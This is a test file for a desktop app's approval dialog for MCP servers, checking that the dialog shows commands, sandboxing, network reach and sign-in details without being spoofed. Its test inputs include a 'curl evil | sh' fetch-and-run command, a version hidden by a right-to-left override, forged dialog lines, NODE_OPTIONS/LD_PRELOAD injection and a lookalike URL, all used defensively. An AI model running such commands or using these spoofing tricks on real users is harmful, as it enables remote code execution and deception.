import { describe, expect, it } from 'vitest';
import type { WorkspaceRoot } from '@agiworkforce/local-runtime-contract';
import { headAndTail, visibleInDialog } from '../runtime/dialogText';
import {
  mcpApprovalConfirmation,
  mcpApprovalNotRecorded,
  type McpApprovalAsked,
  type McpApprovalLaunchShown,
} from '../runtime/mcpApprovalReview';

const root: WorkspaceRoot = {
  id: 'root-1',
  path: '/approved/project',
  name: 'project',
  grantedAtMs: 0,
  lastOpenedAtMs: 0,
};

const QUESTION =
  "This project's MCP file starts server 'github': npx -y @acme/github-mcp (in the sandbox, started in this project folder). Allow it in /approved/project?";

const local: McpApprovalLaunchShown = {
  project: '/approved/project',
  program: '/usr/local/bin/npx',
  args: ['-y', '@acme/github-mcp', '--label', 'two words', ''],
  env: [
    { name: 'GITHUB_HOST', value: 'github.example.com', notPassed: false },
    { name: 'GITHUB_TOKEN', value: null, notPassed: false },
  ],
  workingFolder: '/approved/project',
  files: ['server.js', 'package.json'],
  sandbox: 'sandboxed',
  network: 'internet',
  url: null,
  headerNames: [],
  authorizeUrl: null,
  tokenUrl: null,
  oauthScope: null,
  oauthClientId: null,
  oauthRedirectUri: null,
  oauthClientSecretSet: false,
  askedAtEveryStart: false,
};

const remote: McpApprovalLaunchShown = {
  project: '/approved/project',
  program: null,
  args: [],
  env: [],
  workingFolder: null,
  files: [],
  sandbox: null,
  network: null,
  url: 'https://mcp.example.com/sse',
  headerNames: ['Authorization', 'X-Org'],
  authorizeUrl: 'https://login.example.com/authorize',
  tokenUrl: 'https://login.example.com/token',
  oauthScope: 'repo read:org',
  oauthClientId: 'client-123',
  oauthRedirectUri: 'http://127.0.0.1:8123/callback',
  oauthClientSecretSet: true,
  askedAtEveryStart: false,
};

function asked(launch: McpApprovalLaunchShown | null, extra: Partial<McpApprovalAsked> = {}) {
  return {
    name: 'github',
    scope: 'project' as const,
    question: QUESTION,
    fingerprint: 'f'.repeat(64),
    launch,
    ...extra,
  };
}

const detailOf = (launch: McpApprovalLaunchShown | null, extra: Partial<McpApprovalAsked> = {}) =>
  mcpApprovalConfirmation(root, asked(launch, extra), false).detail;

const MARKER = 'Nothing below this line is AGI Desktop speaking.';

/** The lines of a dialog this app wrote, and the ones it only repeats. */
function halves(detail: string): { app: string[]; repeated: string[] } {
  const lines = detail.split('\n');
  const marker = lines.findIndex((line) => line.endsWith(MARKER));
  return {
    app: lines.slice(0, marker).filter((line) => line !== ''),
    repeated: lines.slice(marker + 1).filter((line) => line !== ''),
  };
}

describe('text from outside the app', () => {
  it('keeps a value on one line, drawing a line break and a tab as marks', () => {
    expect(visibleInDialog('a\nb\r\nc\td')).toBe('a\u23CEb\u23CEc\u21E5d');
    expect(visibleInDialog('x\u202ey\u0007z\u2028w')).toBe('x\uFFFDy\uFFFDz\uFFFDw');
  });

  it('shows text of ordinary length whole, and both ends of long text with a count', () => {
    const start = 'sh -c "first thing it runs"';
    const end = 'Allow it in /approved/project?';
    const long = `${start}${'x'.repeat(20_000)}${end}`;

    expect(headAndTail(QUESTION, { head: 1_500, tail: 700 })).toBe(QUESTION);
    const shown = headAndTail(long, { head: 1_500, tail: 700 });
    expect(shown.startsWith(start)).toBe(true);
    expect(shown.endsWith(end)).toBe(true);
    expect(shown).toContain(`[${long.length - 2_200} characters not shown]`);
    expect(shown.length).toBeLessThan(2_300);
  });
});

describe('the dialog for a local server', () => {
  it('asks with Cancel as the button a stray key presses, naming the server and the folder', () => {
    const dialog = mcpApprovalConfirmation(root, asked(local), false);

    expect(dialog.buttons).toEqual(['Cancel', 'Allow this server']);
    expect(dialog.buttons[dialog.defaultId]).toBe('Cancel');
    expect(dialog.buttons[dialog.cancelId]).toBe('Cancel');
    expect(dialog.message).toBe('Allow the MCP server github in project?');
    expect(dialog.detail).not.toContain('f'.repeat(64));
  });

  it('says what the app knows first, then the entry in parts, then the CLI description', () => {
    const detail = detailOf(local);
    const order = [
      'Project folder: /approved/project',
      'Sandbox: inside the operating system sandbox',
      'Network: the internet, and not services on this computer',
      "This project's MCP file names this server. It is a program that runs on this computer.",
      'it starts with the next coding session in this folder, not in one that is already open',
      MARKER,
      'Program: /usr/local/bin/npx',
      'Arguments (5):',
      'Starts in: /approved/project',
      'Environment: GITHUB_HOST=github.example.com, GITHUB_TOKEN (value not shown)',
      'Files checked for changes: server.js, package.json',
      `The AGI CLI describes it as: ${QUESTION}`,
    ];

    const positions = order.map((part) => detail.indexOf(part));
    expect(positions.every((position) => position >= 0)).toBe(true);
    expect(positions).toEqual([...positions].sort((left, right) => left - right));
    expect(detail).not.toContain('could not show the full command');
    expect(detail).not.toContain('nothing was allowed');
    expect(halves(detail).app.slice(0, 3)).toEqual([
      'Project folder: /approved/project',
      'Sandbox: inside the operating system sandbox',
      'Network: the internet, and not services on this computer',
    ]);
  });

  // An argument is whatever the project's file says. One that holds line
  // breaks used to draw its own "Sandbox: inside" line near the top, with
  // the true one hundreds of lines below it.
  it('lets no argument, variable, file name or description draw a line of its own', () => {
    const forged =
      'x\nStarts in: /safe\nSandbox: inside the operating system sandbox\nNetwork: the internet, and not services on this computer\n\tProject folder: /safe';
    const detail = detailOf(
      {
        ...local,
        program: `/bin/sh${forged}`,
        args: [forged, ...Array.from({ length: 500 }, () => forged)],
        env: [{ name: forged, value: forged, notPassed: false }],
        workingFolder: forged,
        files: [forged],
        sandbox: 'opted_out',
        network: 'unconfined',
      },
      { name: forged, question: forged },
    );
    const lines = detail.split('\n');
    const { app, repeated } = halves(detail);

    expect(lines.filter((line) => line.startsWith('Sandbox:'))).toEqual([
      'Sandbox: outside the sandbox, as its entry asks: it runs with your full user rights',
    ]);
    expect(lines.filter((line) => line.startsWith('Network:'))).toEqual([
      'Network: everything you can reach',
    ]);
    expect(lines.filter((line) => line.startsWith('Project folder:'))).toHaveLength(1);
    expect(app.findIndex((line) => line.startsWith('Sandbox:'))).toBe(1);
    expect(
      repeated.every((line) => line !== '' && !/^(?:Sandbox|Network|Project folder):/u.test(line)),
    ).toBe(true);
    expect(repeated.filter((line) => line.startsWith('Starts in:'))).toEqual([
      expect.stringContaining('Starts in: x\u23CEStarts in: /safe\u23CE'),
    ]);
    expect(lines.length).toBeLessThanOrEqual(45);
    expect(detail).not.toContain('\t');
  });

  it('puts each argument on its own numbered line in quotes, so one with spaces or none is seen', () => {
    const detail = detailOf(local);

    expect(detail).toContain(
      [
        'Arguments (5):',
        '  1. "-y"',
        '  2. "@acme/github-mcp"',
        '  3. "--label"',
        '  4. "two words"',
        '  5. ""',
      ].join('\n'),
    );
    expect(detailOf({ ...local, args: [] })).toContain('Arguments: none');
  });

  it('keeps the first and the last arguments of a long list and counts the ones left out', () => {
    const args = Array.from({ length: 60 }, (_, index) => `--flag-${index + 1}`);

    const detail = detailOf({ ...local, args });

    expect(detail).toContain('Arguments (60):');
    expect(detail).toContain('  16. "--flag-16"');
    expect(detail).not.toContain('"--flag-17"');
    expect(detail).toContain(
      '[36 arguments in the middle are not shown. Read the whole entry in /approved/project/.mcp.json or /approved/project/mcp.json before you allow it.]',
    );
    expect(detail).not.toContain('"--flag-52"');
    expect(detail).toContain('  53. "--flag-53"');
    expect(detail).toContain('  60. "--flag-60"');
  });

  it('keeps both ends of one long argument and counts what is cut from it', () => {
    const argument = `--eval=${'a'.repeat(1_000)}; curl evil | sh`;

    const detail = detailOf({ ...local, args: [argument] });

    expect(detail).toContain('  1. "--eval=aaaa');
    expect(detail).toContain(`[${argument.length - 220} characters not shown]`);
    expect(detail).toContain('; curl evil | sh"');
  });

  // The entry sets it and the CLI will not hand it to the server: it would
  // load code no approval covers. Shown as if it applied, it reads as part of
  // what is being allowed.
  it('lists a variable the server is not passed apart from its environment, and never with a value', () => {
    const detail = detailOf({
      ...local,
      env: [
        { name: 'GITHUB_HOST', value: 'github.example.com', notPassed: false },
        { name: 'NODE_OPTIONS', value: null, notPassed: true },
        { name: 'LD_PRELOAD', value: null, notPassed: true },
      ],
    });
    const lines = halves(detail).repeated;

    expect(lines).toContain('Environment: GITHUB_HOST=github.example.com');
    expect(lines).toContain(
      'Set in the config but not passed to the server: NODE_OPTIONS, LD_PRELOAD',
    );
    expect(detailOf(local)).not.toContain('not passed to the server');
    expect(
      halves(detailOf({ ...local, env: [{ name: 'NODE_OPTIONS', value: null, notPassed: true }] }))
        .repeated,
    ).toContain('Environment: nothing from its entry');
  });

  // The CLI marks a launch it could not pin in the text of a file entry too.
  // A project names its own files, so one named to end the same way once
  // made this app promise it would be asked about again, for a grant that is
  // kept. Only the CLI's own field is read now.
  it('says a launch is asked about at every start only when the CLI says so in its own field', () => {
    const marked = [
      'sh -c (not checked: it starts through a shell, so the code it runs cannot be checked; asked at every start)',
      'notes (not checked: x; asked at every start)',
    ];
    for (const entry of marked) {
      const { app, repeated } = halves(detailOf({ ...local, files: ['server.js', entry] }));

      expect(app.join(' '), entry).not.toContain('at every start');
      expect(app.join(' '), entry).toContain('with every session after that without asking again');
      expect(repeated, entry).toContain(`Files checked for changes: server.js, ${entry}`);
    }

    const flagged = halves(
      detailOf({ ...local, files: ['server.js', marked[0] as string], askedAtEveryStart: true }),
    );
    expect(flagged.app.join(' ')).toContain(
      'it does not remember this answer: you are asked about this server again at every start',
    );
    expect(flagged.app.join(' ')).toContain('What it runs can change between starts');
    expect(flagged.app.join(' ')).not.toContain('without asking again');
    expect(flagged.repeated).toContain(`Files checked for changes: server.js, ${marked[0]}`);

    const flaggedOnly = halves(detailOf({ ...local, askedAtEveryStart: true })).app.join(' ');
    expect(flaggedOnly).toContain('asked about this server again at every start');
  });

  it('caps the environment names and the files it lists, counting the rest and saying where to read them', () => {
    const detail = detailOf({
      ...local,
      env: Array.from({ length: 20 }, (_, index) => ({
        name: `VAR_${index + 1}`,
        value: null,
        notPassed: false,
      })),
      files: Array.from({ length: 19 }, (_, index) => `lib/file-${index + 1}.js`),
    });

    expect(detail).toContain(
      'VAR_16 (value not shown) [4 more are not shown. Read the whole entry',
    );
    expect(detail).not.toContain('VAR_17');
    expect(detail).toContain('lib/file-16.js [3 more are not shown. Read the whole entry');
    expect(detail).not.toContain('lib/file-17.js');
  });

  it('says in plain words when it runs outside the sandbox and what it can reach', () => {
    const outside = detailOf({ ...local, sandbox: 'opted_out', network: 'unconfined' });
    const kept = detailOf({ ...local, sandbox: 'kept_sandboxed', network: 'internet_and_local' });

    expect(outside).toContain(
      'Sandbox: outside the sandbox, as its entry asks: it runs with your full user rights',
    );
    expect(outside).toContain('Network: everything you can reach');
    expect(kept).toContain('though its entry asks to leave it');
    expect(kept).toContain('Network: the internet and services on this computer');
  });

  it('assumes the worst of a containment or a reach it has no words for', () => {
    const detail = detailOf({ ...local, sandbox: 'unknown', network: null });

    expect(detail).toContain('Sandbox: this app could not read how it is contained');
    expect(detail).toContain('Network: this app could not read what it can reach');
  });

  it('draws characters that would hide or reorder the command as a mark, wherever they are', () => {
    const dialog = mcpApprovalConfirmation(
      root,
      asked(
        {
          ...local,
          program: '/bin/sa‮fe',
          args: ['hs | live lruc‮'],
          env: [{ name: 'A\u0007B', value: 'c‮d', notPassed: false }],
          files: ['x‮.js'],
        },
        { name: 'git‮hub', question: 'npx safe‮ hs' },
      ),
      false,
    );

    expect(dialog.message).toBe('Allow the MCP server git�hub in project?');
    expect(dialog.detail).toContain('Program: /bin/sa�fe');
    expect(dialog.detail).toContain('  1. "hs | live lruc�"');
    expect(dialog.detail).toContain('A�B=c�d');
    expect(dialog.detail).toContain('x�.js');
    expect(dialog.detail).toContain('npx safe� hs');
    expect(dialog.detail).not.toContain('‮');
  });
});

describe('the dialog for a remote server', () => {
  it('shows the address, the header names without values, and where it signs in', () => {
    const detail = detailOf(remote, { scope: 'plugin' });
    const order = [
      'Project folder: /approved/project',
      "One of this project's plugins names this server. The AGI CLI on this computer connects to it",
      'it starts with the next coding session in this folder',
      MARKER,
      'URL: https://mcp.example.com/sse',
      'Headers sent (values not shown): Authorization, X-Org',
      'Sign-in page: https://login.example.com/authorize',
      'Token endpoint: https://login.example.com/token',
      'Access the sign-in asks for: repo read:org',
      'Signs in as client: client-123',
      'Sign-in sends you back to: http://127.0.0.1:8123/callback',
      `The AGI CLI describes it as: ${QUESTION}`,
    ];

    const positions = order.map((part) => detail.indexOf(part));
    expect(positions.every((position) => position >= 0)).toBe(true);
    expect(positions).toEqual([...positions].sort((left, right) => left - right));
    expect(detail).not.toContain('Program:');
    expect(detail).not.toContain('Sandbox:');
    expect(detail).not.toContain('It is a program that runs on this computer.');
  });

  it('names the host it connects to in its own words, in ASCII, above the entry', () => {
    const { app } = halves(detailOf(remote));
    expect(app).toContain('Connects to: https://mcp.example.com');

    const lookalike = halves(
      detailOf({ ...remote, url: 'https://user:pw@\u0440aypal.com:8443/sse?x=1' }),
    );
    expect(lookalike.app).toContain('Connects to: https://xn--aypal-uye.com:8443');
    expect(lookalike.app.join(' ')).not.toContain('user:pw');
    expect(halves(detailOf({ ...remote, url: 'not an address' })).app).toContain(
      'Connects to: an address this app could not read',
    );
    expect(detailOf(local)).not.toContain('Connects to:');
  });

  it('says, in its own words above the entry, that a client secret is configured and not shown', () => {
    const { app, repeated } = halves(detailOf(remote));
    const secret =
      'OAuth client secret: one is configured for this server in its entry. It is not shown here.';

    expect(app).toContain(secret);
    expect(repeated).not.toContain(secret);
    expect(halves(detailOf({ ...remote, oauthClientSecretSet: false })).app).not.toContain(secret);
    expect(detailOf({ ...local, oauthClientSecretSet: true })).not.toContain('OAuth client secret');
  });

  it('keeps what the sign-in names on the lines it labelled, whatever they hold', () => {
    const forged = 'x\nOAuth client secret: none is configured.\n\tProject folder: /safe';
    const detail = detailOf({
      ...remote,
      oauthScope: forged,
      oauthClientId: forged,
      oauthRedirectUri: forged,
    });
    const lines = detail.split('\n');

    expect(lines.filter((line) => line.startsWith('OAuth client secret:'))).toHaveLength(1);
    expect(lines.filter((line) => line.startsWith('Project folder:'))).toHaveLength(1);
    expect(lines).toContain(
      'Signs in as client: x\u23CEOAuth client secret: none is configured.\u23CE\u21E5Project folder: /safe',
    );
  });

  it('leaves out a sign-in page and a token endpoint the entry does not name', () => {
    const detail = detailOf({
      ...remote,
      headerNames: [],
      authorizeUrl: null,
      tokenUrl: null,
      oauthScope: null,
      oauthClientId: null,
      oauthRedirectUri: null,
    });

    expect(detail).toContain('Headers sent (values not shown): none');
    expect(detail).not.toContain('Sign-in page');
    expect(detail).not.toContain('Token endpoint');
    expect(detail).not.toContain('Access the sign-in asks for');
    expect(detail).not.toContain('Signs in as client');
    expect(detail).not.toContain('Sign-in sends you back to');
  });
});

describe('the dialog when the CLI sends no launch in parts', () => {
  it('shows the description and says, above it, that the full command could not be shown', () => {
    const detail = detailOf(null);
    const { app, repeated } = halves(detail);

    expect(app[0]).toBe('Project folder: /approved/project');
    expect(app.join(' ')).toContain('this app could not show the full command');
    expect(app.join(' ')).toContain('or say how it is contained');
    expect(app.join(' ')).toContain('Read the whole entry in /approved/project/.mcp.json');
    expect(app.join(' ')).toContain('it starts with the next coding session in this folder');
    expect(repeated).toEqual([`The AGI CLI describes it as: ${QUESTION}`]);
    expect(detail).not.toContain('Program:');
    expect(detail).not.toContain('Sandbox:');
  });

  it('keeps both ends of a long description and says where to read the rest', () => {
    const question = `starts${'x'.repeat(20_000)}Allow it in /approved/project?`;

    const detail = detailOf(null, { question });

    expect(detail).toContain(
      `[${question.length - 2_200} characters in the middle are not shown. Read the whole entry in`,
    );
    expect(detail.endsWith('Allow it in /approved/project?')).toBe(true);
    expect(detail.length).toBeLessThan(3_600);
  });
});

describe('a launch that changed, and a yes the CLI did not record', () => {
  it('opens by saying the configuration changed and nothing was allowed', () => {
    const dialog = mcpApprovalConfirmation(root, asked(local), true);

    expect(
      dialog.detail.startsWith(
        "This server's configuration changed while you were reviewing it, so nothing was allowed.",
      ),
    ).toBe(true);
    expect(dialog.buttons[dialog.defaultId]).toBe('Cancel');
  });

  it('tells the person who chose Allow why nothing was recorded', () => {
    const notice = mcpApprovalNotRecorded({ name: 'git‮hub' }, 'it is not‮ started');

    expect(notice.buttons).toEqual(['OK']);
    expect(notice.message).toBe('The MCP server git�hub was not allowed.');
    expect(notice.detail).toBe('The AGI CLI said: it is not� started');
  });
});
